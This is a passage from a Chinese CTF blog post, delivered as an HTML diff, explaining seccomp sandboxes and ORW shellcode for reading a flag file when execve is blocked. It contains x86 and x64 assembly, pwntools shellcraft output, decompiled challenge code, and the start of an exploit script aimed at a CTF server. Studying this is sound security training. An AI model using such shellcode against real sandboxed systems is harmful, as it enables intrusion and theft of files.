@@ -1,0 +1,403 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="现在有很多pwn题中有沙箱机制。会使用类似seccomp的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。  seccompseccomp (short for secure computing mode) is a computer security facility in the Linux kernel. s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="seccomp_orw">
+<meta property="og:url" content="http://example.com/2021/10/17/seccomp-orw/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="现在有很多pwn题中有沙箱机制。会使用类似seccomp的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。  seccompseccomp (short for secure computing mode) is a computer security facility in the Linux kernel. s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/1.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/3.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/2.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/8.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/6.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/7.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/9.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/10.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/11.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/12.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/14.png">
+<meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/15.png">
+<meta property="article:published_time" content="2021-10-17T00:03:25.000Z">
+<meta property="article:modified_time" content="2022-05-06T00:48:31.402Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="sandbox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/17/seccomp-orw/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>seccomp_orw</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/10/19/ZCTF-2015-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/10/12/de1ctf-2019-weapon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/17/seccomp-orw/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/17/seccomp-orw/&amp;text=seccomp_orw"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/17/seccomp-orw/&amp;is_video=false&amp;description=seccomp_orw"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=seccomp_orw&amp;body=Check out this article: http://example.com/2021/10/17/seccomp-orw/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/17/seccomp-orw/&amp;name=seccomp_orw&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/17/seccomp-orw/&amp;t=seccomp_orw"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp"><span class="toc-number">1.</span> <span class="toc-text">seccomp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89seccomp"><span class="toc-number">1.1.</span> <span class="toc-text">没有seccomp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E4%BA%86seccomp"><span class="toc-number">1.2.</span> <span class="toc-text">加了seccomp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ORW"><span class="toc-number">2.</span> <span class="toc-text">ORW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-asm"><span class="toc-number">3.1.</span> <span class="toc-text">pwnable_asm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-orw"><span class="toc-number">3.2.</span> <span class="toc-text">pwnable_orw</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-start"><span class="toc-number">3.3.</span> <span class="toc-text">pwnable_start</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#noocall"><span class="toc-number">3.4.</span> <span class="toc-text">noocall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        seccomp_orw
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-17T00:03:25.000Z" itemprop="datePublished">2021-10-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/sandbox/" rel="tag">sandbox</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="4">
+
+<blockquote>
+<p>现在有很多pwn题中有沙箱机制。会使用类似<code>seccomp</code>的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。</p>
+</blockquote>
+<h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><p><strong>seccomp</strong> (short for <strong>secure computing mode</strong>) is a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_security">computer security</a> facility in the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_kernel">Linux kernel</a>. seccomp allows a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Process_(computing)">process</a> to make a one-way transition into a “secure” state where it cannot make any <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/System_call">system calls</a> except <code>exit()</code>, <code>sigreturn()</code>, <code>read()</code> and <code>write()</code> to already-open <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_descriptor">file descriptors</a>. Should it attempt any other system calls, the kernel will terminate the process with <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SIGKILL">SIGKILL</a> or <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SIGSYS">SIGSYS</a>.[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seccomp#cite_note-1">1]</a>[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seccomp#cite_note-2">2]</a> In this sense, it does not <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Virtual_machine">virtualize</a> the system’s resources but isolates the process from them entirely.</p>
+<p>看个seccomp和没有seccomp的例子吧，首先得先安装一下相应的头文件。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="没有seccomp"><a href="#没有seccomp" class="headerlink" title="没有seccomp"></a>没有seccomp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g z1r01.c -o z1r01</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line">    <span class="type">char</span> * filename = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="type">char</span> * ar[] = {<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>};</span><br><span class="line">    <span class="type">char</span> * envp[] = {<span class="literal">NULL</span>};</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>,<span class="string">"/bin/sh\n"</span>,<span class="number">8</span>);</span><br><span class="line">    syscall(<span class="number">59</span>,filename,ar,envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2021/10/17/seccomp-orw/1.png"></p>
+<h3 id="加了seccomp"><a href="#加了seccomp" class="headerlink" title="加了seccomp"></a>加了seccomp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g z1r02.c -o z1r02 -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line">    </span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line"></span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> * filename = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="type">char</span> * ar[] = {<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>};</span><br><span class="line">    <span class="type">char</span> * envp[] = {<span class="literal">NULL</span>};</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>,<span class="string">"/bin/sh\n"</span>,<span class="number">8</span>);</span><br><span class="line">    syscall(<span class="number">59</span>,filename,ar,envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>ctx是Filter context/handle,其中typedef void *scmp_filter_ctx;</p>
+<p>seccomp_init是初始化的过滤状态,这里用的是SCMP_ACT_ALLOW,表示默认允许所有的syscacll.如果初始化状态为SCMP_ACT_KILL,则表示默认不允许所有的syscall</p>
+</blockquote>
+<p>使用seccomp-tools来检测一下吧。</p>
+<p><img src="/2021/10/17/seccomp-orw/3.png"></p>
+<p><img src="/2021/10/17/seccomp-orw/2.png"></p>
+<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><blockquote>
+<p>使用 open 函数打开 flag 文件，read 读取文件内容，write 写到标准输出 stdout，这样就可以从屏幕打印出来 flag</p>
+</blockquote>
+<p>在堆题中，一般会在劫持了某钩子函数如 __free_hook 或 got 表之后考虑实现 orw，例如下面的32位和64位的orw flag。一般来说我们希望这个 gadget 能够实现栈迁移，一种比较通用的做法是利用 setcontext 函数。</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span> = </span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx; <span class="comment"># edx  = int mode 设定权限的</span></span><br><span class="line">push ecx; <span class="comment">#字符串结束符\x00</span></span><br><span class="line">push <span class="number">0x67616c66</span>; <span class="comment">#flag字符串</span></span><br><span class="line">mov ebx,esp;  <span class="comment">#ebx = const char __user *filename</span></span><br><span class="line">mov eax,<span class="number">0x5</span>;  <span class="comment"># eax = sys_open , 系统调用号</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;  <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">read = </span><br><span class="line">mov eax,<span class="number">0x3</span>;  <span class="comment"># eax = sys_read ，系统调用号为3</span></span><br><span class="line">mov ecx,ebx;  <span class="comment"># ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line">mov ebx,<span class="number">0x3</span>;  <span class="comment"># ebx = unsigned int fd = 3 ,文件描述符</span></span><br><span class="line">mov edx,<span class="number">0x100</span>; <span class="comment"># edx = size_t count 对应字节数</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;  <span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">write = </span><br><span class="line">mov eax,<span class="number">0x4</span>; <span class="comment"># eax = sys_write ，系统调用号为4</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>; <span class="comment"># ebx = unsigned int fd = 1,文件描述符</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>; <span class="comment">#syscall</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#open(const char *filename,int flags,int mode) x64下调用号2(rax)</span></span><br><span class="line"><span class="meta">#push rsp把栈顶指针寄存器中的值也即指向文件路径的指针赋值给rdi</span></span><br><span class="line">open=<span class="string">'''</span></span><br><span class="line">push <span class="number">0x67616c66</span>  </span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push <span class="number">2</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="meta">#read(unsigned int fd,char *buf,size_t count) 其中open函数的返回值也就是fd，存放于rax中</span></span><br><span class="line">read=<span class="string">'''</span></span><br><span class="line">push rax</span><br><span class="line">pop rdi</span><br><span class="line">push <span class="number">0x123200</span></span><br><span class="line">pop rsi</span><br><span class="line">push <span class="number">0x100</span></span><br><span class="line">pop rdx</span><br><span class="line">xor rax,rax </span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="meta">#write(unsigned int fd,const char *buf,size_t count) 1为标准输出流，rsi和rdx不变，系统调用号为1</span></span><br><span class="line">write=<span class="string">'''</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">pop rdi</span><br><span class="line">push <span class="number">1</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="pwnable-asm"><a href="#pwnable-asm" class="headerlink" title="pwnable_asm"></a>pwnable_asm</h3><blockquote>
+<p>pwnable上和buuctf都有，可以远程打。buuctf的题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_asm">https://buuoj.cn/challenges#pwnable_asm</a></p>
+</blockquote>
+<p>IDA一下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to shellcoding practice challenge."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)"</span>);</span><br><span class="line">  s = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x41414000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">144</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(stub);</span><br><span class="line">  <span class="built_in">memcpy</span>(s, stub, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, s + <span class="number">46</span>, <span class="number">0x3E8</span>uLL);</span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  chroot(<span class="string">"/home/asm_pwn"</span>);</span><br><span class="line">  sandbox(<span class="string">"/home/asm_pwn"</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *))s)(<span class="string">"/home/asm_pwn"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>题目中的沙箱限制了大多数函数的使用，只能使用read、write、open、exit函数。可以看到puts中让我们尝试使用orw。在pwntools中自带了shellcraft 模块，可以生成相应架构的 shellcode。这题可以直接使用shellcraft模块生成orw。其中自带的模块的字节大小可能会大，题目中可能会限制输入的大小。</p>
+<p><img src="/2021/10/17/seccomp-orw/8.png"></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">'/flag'</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, offest, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, offest, <span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* open(file='/flag', oflag=0, mode=0) */</span></span><br><span class="line"><span class="comment">/* push b'/flag\x00' */</span></span><br><span class="line">mov rax, <span class="number">0x101010101010101</span></span><br><span class="line">push rax</span><br><span class="line">mov rax, <span class="number">0x101010101010101</span> ^ <span class="number">0x67616c662f</span></span><br><span class="line">xor [rsp], rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx <span class="comment">/* 0 */</span></span><br><span class="line">xor esi, esi <span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">/* call open() */</span></span><br><span class="line">push SYS_open <span class="comment">/* 2 */</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* call read(3, 0x41414100, 0x100) */</span></span><br><span class="line">xor eax, eax <span class="comment">/* SYS_read */</span></span><br><span class="line">push <span class="number">3</span></span><br><span class="line">pop rdi</span><br><span class="line">xor edx, edx</span><br><span class="line">mov dh, <span class="number">0x100</span> &gt;&gt; <span class="number">8</span></span><br><span class="line">mov esi, <span class="number">0x1010101</span> <span class="comment">/* 1094795520 == 0x41414100 */</span></span><br><span class="line">xor esi, <span class="number">0x40404001</span></span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* write(fd=1, buf=0x41414100, n=0x100) */</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">pop rdi</span><br><span class="line">xor edx, edx</span><br><span class="line">mov dh, <span class="number">0x100</span> &gt;&gt; <span class="number">8</span></span><br><span class="line">mov esi, <span class="number">0x1010101</span> <span class="comment">/* 1094795520 == 0x41414100 */</span></span><br><span class="line">xor esi, <span class="number">0x40404001</span></span><br><span class="line"><span class="comment">/* call write() */</span></span><br><span class="line">push SYS_write <span class="comment">/* 1 */</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25833</span>)</span><br><span class="line"><span 